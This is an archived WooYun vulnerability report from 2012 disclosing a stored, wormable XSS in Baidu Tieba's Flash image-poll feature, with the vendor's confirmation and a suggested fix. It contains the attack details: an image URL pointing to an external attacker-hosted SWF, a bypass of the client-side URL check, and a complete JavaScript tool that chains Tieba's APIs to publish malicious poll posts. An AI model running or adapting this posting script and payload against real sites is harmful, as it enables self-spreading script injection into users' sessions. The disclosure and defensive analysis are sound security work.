@@ -1,0 +1,436 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		百度贴吧存储型XSS - Flash又中枪了～～  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		百度贴吧存储型XSS - Flash又中枪了～～  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-06-16 12:06</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-16：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-07-09：	细节向普通白帽子公开<br/>
+									2012-07-19：	细节向实习白帽子公开<br/>
+									2012-07-31：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">由于是帖子正文的存储型Xss,自动触发，可蠕虫，危害你们比俺清楚。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">发现流程如下：<br />
+<br />
+<br />
+<br />
+1. 平时有事没事的时候，就会去自己的gainover吧测试一下。<br />
+<br />
+<br />
+<br />
+2. 今天晚上又去了，一直还没用过投票功能咧，就进去看了下。<br />
+<br />
+<br />
+<br />
+3. 发现有一个图片投票的功能，于是就随便弄了3个图，发布了一下。<br />
+<br />
+<br />
+<br />
+4. 发布之后，发现这个投票，是Flash做的。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/160245517dc38e044f044697e6c55be3b8748fed.jpg" target="_blank"><img src="../images/160245517dc38e044f044697e6c55be3b8748fed.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5. 既然图片是在Flash里加载的，那么肯定是用的 Loader类来加载外部图片URL实现的了。<br />
+<br />
+<br />
+<br />
+6. 直觉告诉我，这里可能存在一处安全问题。<br />
+<br />
+<br />
+<br />
+7. 这里存在安全问题需要满足几个条件，A. 投票的flash允许执行脚本，即allowscriptaccess需为samedomain/未设置/always，但是投票的flash文件与百度贴吧不同域，因为allowscriptacess必须为always。 B. flash里未对外部加载的URL内容进行判断<br />
+<br />
+<br />
+<br />
+8. F12 打开调试工具，可以看到我们运气真好，allowscriptaccess是always，希望就在前方。<br />
+<br />
+<br />
+<br />
+ </p><p class="detail"><a href="../images/1602460922950861f783d0e402a321040c2fbb01.jpg" target="_blank"><img src="../images/1602460922950861f783d0e402a321040c2fbb01.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+9. 接着我们再次去发表投票的位置，将其中一个图片地址改为 http://xsst.sinaapp.com/Xjs.swf#.gif, 提交的时候，提示如下：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/160246236a492f84688f0e217ad5421be00dac44.jpg" target="_blank"><img src="../images/160246236a492f84688f0e217ad5421be00dac44.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+10. 但是，抓包不难看出，这种验证仅仅是客户端的验证。我们修改请求数据，很容易就成功绕过了。<br />
+<br />
+<br />
+<br />
+11. 用抓包工具，查看我们生成的投票。可以看见，确实调用了我们的flash文件。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://static.tieba.baidu.com/tb/flash/vote.swf?r=166486139965bce7156bc36762bb2c3edf&amp;voteId=0e1e9a0f95d922fc978c0adf&amp;tn=ajaxCanVote&amp;stamp=1339767810003</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/16024647c7ac327f2226fbc7ef24b2ca3161a0d4.jpg" target="_blank"><img src="../images/16024647c7ac327f2226fbc7ef24b2ca3161a0d4.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+进一步用以下代码在本地进行模拟 （例如:http://localhost/tieba.htm）。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;embed src=&quot;http://static.tieba.baidu.com/tb/flash/vote.swf?r=166486139965bce7156bc36762bb2c3edf&amp;voteId=0e1e9a0f95d922fc978c0adf&amp;tn=ajaxCanVote&amp;stamp=1339767810003&quot; allowscriptaccess=&quot;always&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;/embed&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+成功弹窗。<br />
+<br />
+<br />
+<br />
+12. 综上，我们在 7 里所说的2个条件，此处均满足，也就意味着，确实存在安全问题。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+--------------------   漏洞利用篇 -------------------------<br />
+<br />
+<br />
+<br />
+上面是分析过程，下面为了方便我们对此漏洞的利用，我们对投票过程加以分析。可以得到以下流程。<br />
+<br />
+<br />
+<br />
+1. 添加一个投票：POST http://tieba.baidu.com/vote/commit/add_vote?alt=json <br />
+<br />
+<br />
+<br />
+2. 获取贴吧tbs: GET http://tieba.baidu.com/dc/common/tbs?t=0.7085538243409246<br />
+<br />
+<br />
+<br />
+3. 发表一个投票贴: POST http://tieba.baidu.com/f/commit/vote/add<br />
+<br />
+<br />
+<br />
+4. 关联投票与投票贴： POST http://tieba.baidu.com/vote/commit/add_vote_relation?alt=json<br />
+<br />
+<br />
+<br />
+基于以上步骤，我拿js写了一个简单的发帖工具：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;textarea id=&quot;t&quot; style=&quot;width:100%;height:150px&quot;&gt;&lt;/textarea&gt;<br />
+	&lt;input type=&quot;button&quot; value=&quot;Post a Xss vote&quot; onclick=&quot;ok()&quot; /&gt;<br />
+	&lt;script type=&quot;text/javascript&quot;&gt;<br />
+		var config={<br />
+			&quot;kw&quot;:&quot;gainover&quot;,<br />
+			&quot;id&quot;:&quot;751341&quot;,<br />
+			&quot;title&quot;:&quot;Just test for fun&quot;<br />
+		};<br />
+		//添加一个投票<br />
+		function addVote (){<br />
+			$(&quot;t&quot;).value+=&quot;添加投票中....\n&quot;;<br />
+			Net.post(&quot;http://tieba.baidu.com/vote/commit/add_vote?alt=json&quot;,{<br />
+				&quot;product_name&quot;:&quot;forum&quot;,<br />
+				&quot;title&quot;:config.title,<br />
+				&quot;expire_time&quot;:&quot;2012-06-22 21:18:44&quot;,<br />
+				&quot;item_type&quot;:&quot;1&quot;,<br />
+				&quot;max_select_num&quot;:&quot;1&quot;,<br />
+				&quot;perm&quot;:&quot;0&quot;,<br />
+				&quot;attr_key_1&quot;:&quot;forum_name&quot;,<br />
+				&quot;attr_value_1&quot;:config.kw,<br />
+				&quot;attr_key_2&quot;:&quot;forum_id&quot;,<br />
+				&quot;attr_value_2&quot;:config.id, //gainover吧<br />
+				&quot;item_title_1&quot;:&quot;vote 1:&quot;+$R(6,&quot;ns&quot;),<br />
+				&quot;item_content_1&quot;:&quot;http://xsst.sinaapp.com/Xjs.swf#1.gif&quot;,<br />
+				&quot;item_title_2&quot;:&quot;vote 2:&quot;+$R(6,&quot;ns&quot;),<br />
+				&quot;item_content_2&quot;:&quot;http://imgsrc.baidu.com/forum/pic/item/b9d3efb1c21a60589a50274f.jpg&quot;,<br />
+				&quot;item_title_3&quot;:&quot;vote 3:&quot;+$R(6,&quot;ns&quot;),<br />
+				&quot;item_content_3&quot;:&quot;http://imgsrc.baidu.com/forum/pic/item/b9d3efb1c21a60589a50274f.jpg&quot;,<br />
+				&quot;ie&quot;:&quot;utf-8&quot;<br />
+			},function(rs){<br />
+				$(&quot;t&quot;).value+=&quot;添加投票成功\n&quot;;<br />
+				var vid=rs.vote_id;<br />
+				var sid=rs.sign_id;<br />
+				getTBS(function(rs){<br />
+					addVotePost(rs.tbs,vid,sid);<br />
+				});<br />
+			},&quot;json&quot;);<br />
+		}<br />
+		//获得tbs<br />
+		function getTBS (callback){<br />
+			$(&quot;t&quot;).value+=&quot;获取tbs参数....\n&quot;;<br />
+			Net.get(&quot;http://tieba.baidu.com/dc/common/tbs?t=&quot;+Math.random(),function(rs){<br />
+				$(&quot;t&quot;).value+=&quot;添加tbs参数成功\n&quot;;<br />
+				if(callback){<br />
+					callback(rs);<br />
+				}<br />
+			},&quot;json&quot;);<br />
+		}<br />
+		//添加一个投票贴<br />
+		function addVotePost (tbs,vid,sid){<br />
+			$(&quot;t&quot;).value+=&quot;发表投票贴中....\n&quot;;<br />
+			Net.post(&quot;http://tieba.baidu.com/f/commit/vote/add&quot;,{<br />
+				&quot;kw&quot;:config.kw,<br />
+				&quot;title&quot;:config.title,<br />
+				&quot;content&quot;:&quot;&quot;,<br />
+				&quot;tid&quot;:&quot;0&quot;,<br />
+				&quot;floor_num&quot;:&quot;0&quot;,<br />
+				&quot;anonymous&quot;:&quot;&quot;,<br />
+				&quot;rich_text&quot;:&quot;&quot;,<br />
+				&quot;pic_url&quot;:&quot;&quot;,<br />
+				&quot;sign_id&quot;:&quot;&quot;,<br />
+				&quot;vcode&quot;:&quot;&quot;,<br />
+				&quot;fid&quot;:config.id,<br />
+				&quot;vid_md5&quot;:vid+&quot;,&quot;+sid,<br />
+				&quot;vcode_md5&quot;:&quot;&quot;,<br />
+				&quot;ie&quot;:&quot;utf-8&quot;,<br />
+				&quot;tbs&quot;:tbs<br />
+			},function(rs){<br />
+				if(rs.no==0&amp;&amp;rs.error==&quot;&quot;){<br />
+					$(&quot;t&quot;).value+=&quot;发表带Xss的投票贴成功\n&quot;;<br />
+					addVoteRelation(rs.data.tid,vid,sid);<br />
+				}else{<br />
+					$(&quot;t&quot;).value+=&quot;addVotePost(&quot;+tbs+&quot;,&quot;+vid+&quot;,&quot;+sid+&quot;) 出错\n&quot;;<br />
+				}<br />
+			},&quot;json&quot;);<br />
+		}<br />
+		//将投票贴与投票关联<br />
+		function addVoteRelation (tid,vid,sid){	//thread_id,vote_id,sign_id<br />
+			Net.post(&quot;http://tieba.baidu.com/vote/commit/add_vote_relation?alt=json&quot;,{<br />
+				&quot;product_name&quot;:&quot;forum&quot;,<br />
+				&quot;id_1&quot;:tid,<br />
+				&quot;id_2&quot;:config.id,<br />
+				&quot;vote_id&quot;:vid,<br />
+				&quot;sign_id&quot;:sid,<br />
+				&quot;ie&quot;:&quot;utf-8&quot;,<br />
+				&quot;_&quot;:&quot;&quot;<br />
+			},function(rs){<br />
+				$(&quot;t&quot;).value+=&quot;Complete, it&#039;s OK!!!&quot;;<br />
+			},&quot;json&quot;);<br />
+		}<br />
+		function ok (){<br />
+			$(&quot;t&quot;).value=&quot;&quot;;<br />
+			addVote();<br />
+		}<br />
+	&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+当然以上过程，修改为自动化的话，就变蠕虫啦，这里我只是给出一个本地点击一下按钮，即可发布一篇带有Xss的投票贴的演示。 <br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/16024724b041119b7e7cf57cbb3964275f4d508c.jpg" target="_blank"><img src="../images/16024724b041119b7e7cf57cbb3964275f4d508c.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+-----------------------------------------<br />
+<br />
+<br />
+<br />
+效果见漏洞证明！ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见：http://tieba.baidu.com/p/1665378430  （为了安全考虑，帖子会自动加载我的no.js，但是no.js里的代码已经被我删掉，因而不会有弹窗。）<br />
+<br />
+<br />
+<br />
+下面是我截的弹窗图<br />
+<br />
+<br />
+<br />
+---------------------------<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/160249497050ba23a77278eb2ec4240ef5285fcd.jpg" target="_blank"><img src="../images/160249497050ba23a77278eb2ec4240ef5285fcd.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+---------------------------<br />
+<br />
+<br />
+<br />
+抓包加载图<br />
+<br />
+<br />
+<br />
+---------------------------<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/16025007ad353283c5c82531d97d8dba2642dc1a.jpg" target="_blank"><img src="../images/16025007ad353283c5c82531d97d8dba2642dc1a.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+---------------------------<br />
+<br />
+<br />
+<br />
+调试工具节点图<br />
+<br />
+<br />
+<br />
+---------------------------<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1602502046755a3e1edf3cf3e91c3652ee9ca9f3.jpg" target="_blank"><img src="../images/1602502046755a3e1edf3cf3e91c3652ee9ca9f3.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">我想，这个投票只是个投票请求，应该不需要FLASH与js的交互吧，因而将投票的flash的allowscriptaccess参数改为never是最简单的解决办法。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-08354" title="百度贴吧存储型XSS - Flash又中枪了～～">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-06-19 14:43</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提交，我们会尽快修复</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="8354";
+var bugRating="2";
+var myRating="";
+var ratingCount="4";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
